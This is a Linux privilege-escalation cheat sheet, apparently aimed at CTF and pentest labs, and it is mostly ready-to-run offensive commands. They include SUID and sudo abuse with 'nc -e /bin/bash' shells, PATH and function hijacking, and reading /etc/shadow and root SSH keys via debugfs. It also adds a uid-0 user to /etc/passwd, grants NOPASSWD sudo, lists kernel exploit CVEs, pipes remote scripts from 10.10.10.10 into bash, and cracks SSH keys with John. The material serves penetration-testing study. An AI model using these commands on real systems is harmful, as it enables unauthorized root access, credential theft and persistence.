# Linux-Privilege-Escalation
Tips and Tricks for Linux Priv Escalation

Fix the Shell:
```
python -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z

# In Kali Note the number of rows and cols in the current terminal window
$ stty -a  

# Next we will enable raw echo so we can use TAB autocompletes 
$ stty raw -echo
$ fg

# In reverse shell
$ stty rows <num> columns <cols>
   
# Finally
$ reset
$ export SHELL=bash
$ export TERM=xterm-256color
```

## Start with the basics

Who am i and what groups do I belong to?  
`id`

Who else is on this box (lateral movement)?  
`ls -la /home`  
`cat /etc/passwd`  

What Kernel version and distro are we working with here?  
`uname -a`  
`cat /etc/issue`  

What new processes are running on the server (Thanks to IPPSEC for the script!):   
``` 
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)

while true; do
  new_process=$(ps aux --forest | grep -v "ps aux --forest" | grep -v "sleep 1" | grep -v $0)
  diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
  sleep 1
  old_process=$new_process
done
```

We can also use pspy on linux to monitor the processes that are starting up and running:  
https://github.com/DominicBreuker/pspy

Check the services that are listening:
```bash
ss -lnpt
```


## What can we EXECUTE?

Who can execute code as root (probably will get a permission denied)?  
`cat /etc/sudoers`

Can I execute code as root (you will need the user's password)?  
`sudo -l`

What executables have SUID bit that can be executed as another user?  
`find / -type f -user root -perm /u+s -ls 2>/dev/null`  
`find / -user root -perm -4000 -print 2>/dev/null`  
`find / -perm -u=s -type f 2>/dev/null`  
`find / -user root -perm -4000 -exec ls -ldb {} \;`  

Do any of the SUID binaries run commands that are vulnerable to file path manipulation?  
`strings /usr/local/bin/binaryelf`  
`mail`  
`echo "/bin/sh" > /tmp/mail` 
`cd /tmp`  
`export PATH=.`  
`/usr/local/bin/binaryelf`  

Do any of the SUID binaries run commands that are vulnerable to Bash Function Manipulation?
`strings /usr/bin/binaryelf`  
`mail`
`function /usr/bin/mail() { /bin/sh; }`  
`export -f /usr/bin/mail`  
`/usr/bin/binaryelf`  

Can I write files into a folder containing a SUID bit file?  
Might be possible to take advantage of a '.' in the PATH or an The IFS (or Internal Field Separator) Exploit.  

If any of the following commands appear on the list of SUID or SUDO commands, they can be used for privledge escalation:

| SUID / SUDO Executables               | Priv Esc Command (will need to prefix with sudo if you are using sudo for priv esc. |
|---------------------------------------|-------------------------------------------------------------------------------------|
| (ALL : ALL ) ALL                      | You can run any command as root.<br>sudo su - <br>sudo /bin/bash                                 |
| nmap<br>(older versions 2.02 to 5.21) | nmap --interactive<br>!sh                                                           |
| netcat<br>nc<br>nc.traditional        | nc -nlvp 4444 &<br> nc -e /bin/bash 127.0.0.1 4444                                  |
| ncat                                  |                                                                                     |
| awk <br>gawk                          | awk '{ print }' /etc/shadow <br> awk 'BEGIN {system("id")}'                         |
| python                                | python -c 'import pty;pty.spawn("/bin/bash")'                                       |
| php                                   |      |
| find                                  | find /home -exec nc -lvp 4444 -e /bin/bash \\;<br> find /home -exec /bin/bash \\;  |
| xxd                                   |                                                                                     |
| vi                                    |                                                                                     |
| more                                  |                                                                                     |
| less                                  |                                                                                     |
| nano                                  |                                                                                     |
| cp                                    |                                                                                     |
| cat                                   |                                                                                     |
| bash                                  |                                                                                     |
| ash                                  |                                                                                     |
| sh                                  |                                                                                     |
| csh                                  |                                                                                     |
| curl                                  |                                                                                     |
| dash                                  |                                                                                     |
| pico                                  |                                                                                     |
| nano                                  |                                                                                     |
| vrim                                  |                                                                                     |
| tclsh                                  |                                                                                     |
| git                                  |                                                                                     |
| scp                                  |                                                                                     |
| expect                                  |                                                                                     |
| ftp                                  |                                                                                     |
| socat                                  |                                                                                     |
| script                                  |                                                                                     |
| ssh                                  |                                                                                     |
| zsh                                  |                                                                                     |
| tclsh                                  |                                                                                     |
| strace                                  |  Write and compile a a SUID SUID binary c++ program <br> strace chown root:root suid <br> strace chmod u+s suid <br> ./suid        |
| npm                                 |  ln -s /etc/shadow package.json && sudo /usr/bin/npm i *                            |
| rsync                                  |                                                                                     |
| tar                                  |                                                                                     |
|Screen-4.5.00 				| https://www.exploit-db.com/exploits/41154/					   |

*Note:* You can find an incredible list of Linux binaries that can lead to privledge escalation at the GTFOBins project website here:  
https://gtfobins.github.io/


Can I access services that are running as root on the local network?  
`netstat -antup`  
`ps -aux | grep root`  

| Network Services Running as Root      | Exploit actions                                                                     |
|---------------------------------------|-------------------------------------------------------------------------------------|
| mysql                                 | raptor_udf2 exploit<br> 0xdeadbeef.info/exploits/raptor_udf2.c <br> insert into foo values(load_file('/home/smeagol/raptor_udf2.so'));                   |
| apache 			        | drop a reverse shell script on to the webserver                                     |
| nfs	 			        | no_root_squash parameter <br>  Or <br> if you create the same user name and matching user id as the remote share you can gain access to the files and write new files to the share  |
| PostgreSQL                            | https://www.exploit-db.com/exploits/45184/                                          |


Are there any active tmux sessions we can connect to?  
`tmux ls`  

## What can we READ?
What files and folders are in my home user's directory?  
`ls -la ~`  

Do any users have passwords stored in the passwd file?
`cat /etc/passwd`  

Are there passwords for other users or RSA keys for SSHing into the box?  
`ssh -i id_rsa root@10.10.10.10`  

Are there configuration files that contain credentials?

| Application and config file           | Config File Contents                                                                |
|---------------------------------------|-------------------------------------------------------------------------------------|
| WolfCMS <br> config.php               | // Database settings: <br> define('DB_DSN', 'mysql:dbname=wolf;host=localhost;port=3306');<br> define('DB_USER', 'root');<br> define('DB_PASS', 'john@123');<br>        |
| Generic PHP Web App                   | define('DB_PASSWORD', 's3cret');                                                     |
| .ssh directory 		        | authorized_keys<br>id_rsa<br>id_rsa.keystore<br>id_rsa.pub<br>known_hosts            |
| User MySQL Info	                | .mysql_history<br>.my.cnf						               |
| User Bash History 	                | .bash_history                  					               |

Are any of the discovered credentials being reused by multiple acccounts?  
`sudo - username`  
`sudo -s`  

Are there any Cron Jobs Running?  
`cat /etc/crontab`  

What files have been modified most recently?  
`find /etc -type f -printf '%TY-%Tm-%Td %TT %p\n' | sort -r`  
`find /home -type f -mmin -60`  
`find / -type f -mtime -2`  

Is the user a member of the Disk group and can we read the contents of the file system?  
`debugfs /dev/sda`  
`debugfs: cat /root/.ssh/id_rsa`  
`debugfs: cat /etc/shadow`  

Is the user a member of the Video group and can we read the Framebuffer?  
`cat /dev/fb0 > /tmp/screen.raw`  
`cat /sys/class/graphics/fb0/virtual_size`  

## Where can we WRITE?

What are all the files can I write to?  
`find / -type f -writable -path /sys -prune -o -path /proc -prune -o -path /usr -prune -o -path /lib -prune -o -type d 2>/dev/null`  

What folder can I write to?  
`find / -regextype posix-extended -regex "/(sys|srv|proc|usr|lib|var)" -prune -o -type d -writable 2>/dev/null`  

| Writable Folder / file    | Priv Esc Command                                                                                |
|---------------------------|-------------------------------------------------------------------------------------------------|
| /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
| /etc/passwd               | manually add a user with a password of "password" using the following syntax<br>user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash <br> You can even escalate to the root user in some cases with the following syntax: <br> admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash                         |


*Root SSH Key* If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.  
```
cat /etc/ssh/sshd_config | grep PermitRootLogin
```  
*Add SUDOers* If we can write arbitrary files to the host as Root, it is possible to add users to the SUDO-ers group like so (NOTE: you will need to logout and login again as myuser):  
/etc/sudoers  
```
root    ALL=(ALL:ALL) ALL
%sudo   ALL=(ALL:ALL) ALL
myuser	ALL=(ALL) NOPASSWD:ALL  
```
*Set Root Password* We can also change the root password on the host if we can write to any file as root:  
/etc/shadow  
```
printf root:>shadown
openssl passwd -1 -salt salty password >>shadow
```

## Kernel Exploits

Based on the Kernel version, do we have some reliable exploits that can be used?

UDEV - Linux Kernel < 2.6 & UDEV < 1.4.1 - CVE-2009-1185 - April 2009  

	Ubuntu 8.10  
	Ubunto 9.04  
	Gentoo  

RDS -  Linux Kernel <= 2.6.36-rc8 - CVE-2010-3904 - Linux  Exploit -

	Centos 4/5

perf_swevent_init - Linux Kernel < 3.8.9 (x86-64) - CVE-2013-2094 - June 2013  
	
	Ubuntu 12.04.2  

mempodipper - Linux Kernel 2.6.39 < 3.2.2 (x86-64) - CVE-2012-0056 - January 2012  
    
    Ubuntu 11.10
    Ubuntu 10.04  
    Redhat 6  
    Oracle 6  

Dirty Cow - Linux Kernel 2.6.22 < 3.2.0/3.13.0/4.8.3 - CVE-2016-5195 - October 2016

	Ubuntu 12.04
	Ubuntu 14.04
	Ubuntu 16.04
	
KASLR / SMEP - Linux Kernel < 4.4.0-83 / < 4.8.0-58 - CVE-2017-1000112 - August 2017

	Ubuntu 14.04
	Ubuntu 16.04
	

	
Great list here:
https://github.com/lucyoa/kernel-exploits

## Automated Linux Enumeration Scripts
It is always a great idea to automate the enumeration process once you understand what you are looking for.

### LinEmum.sh
LinEnum is a handy method of automating Linux enumeration.  It is also written as a shell script and does not require any other intpreters (Python,PERL etc.) which allows you to run it file-lessly in memory.

First we need to git a copy to our local Kali linux machine:
```
git clone https://github.com/rebootuser/LinEnum.git
```
Next we can serve it up in the python simple web server:
```
root@kali:~test# cd LinEnum/
root@kali:~test/LinEnum# ls
root@kali:~test/LinEnum# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
```
And now on our remote Linux machine we can pull down the script and pipe it directly to Bash:
```
www-data@vulnerable:/var/www$ curl 10.10.10.10/LinEnum.sh | bash
```
And the enumeration script should run on the remote machine.

## CTF Machine Tactics

Often it is easy to identify when a machine was created by the date / time of file edits.
We can create a list of all the files with a modify time in that timeframe with the following command:
```
find -L /  -type f -newermt 2019-08-24 ! -newermt 2019-08-27 2>&1 > /tmp/foundfiles.txt
```
This has helped me to find interesting files on a few different CTF machines.

Recursively searching for passwords is also a handy technique:
```
grep -ri "passw" .
```

Wget Pipe a remote URL directory to Bash (linpeas):
```
wget -q -O - "http://10.10.10.10/linpeas.sh" | bash
```

Curl Pipe a remote URL directly to Bash (linpeas):
```
curl -sSk "http://10.10.10.10/linpeas.sh" | bash
```

## Using SSH Keys
Often, we are provided with password protected SSH keys on CTF boxes.  It it helpful to be able to quicky crack and add these to your private keys.

First we need to convert the ssh key using John:
```
kali@kali:~/.ssh$ /usr/share/john/ssh2john.py ./id_rsa > ./id_rsa_john
...
```

Next we will need to use that format to crack the password:
```
/usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt ./id_rsa_john
```

John should output a password for the private key.

```

```


## References

https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/   
http://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/  
https://payatu.com/guide-linux-privilege-escalation/  
http://www.hackingarticles.in/editing-etc-passwd-file-for-privilege-escalation/  
http://www.0daysecurity.com/penetration-testing/enumeration.html  
https://www.rebootuser.com/?p=1623#.V0W5Pbp95JP  
https://www.doomedraven.com/2013/04/hacking-linux-part-i-privilege.html  
https://securism.wordpress.com/oscp-notes-privilege-escalation-linux/  
https://haiderm.com/linux-privilege-escalation-using-weak-nfs-permissions/  
http://hackingandsecurity.blogspot.com/2016/06/exploiting-network-file-system-nfs.html  
https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt 
https://hkh4cks.com/blog/2017/12/30/linux-enumeration-cheatsheet/  
https://digi.ninja/blog/when_all_you_can_do_is_read.php  
https://medium.com/@D00MFist/vulnhub-lin-security-1-d9749ea645e2  
https://gtfobins.github.io/  
https://github.com/rebootuser/LinEnum

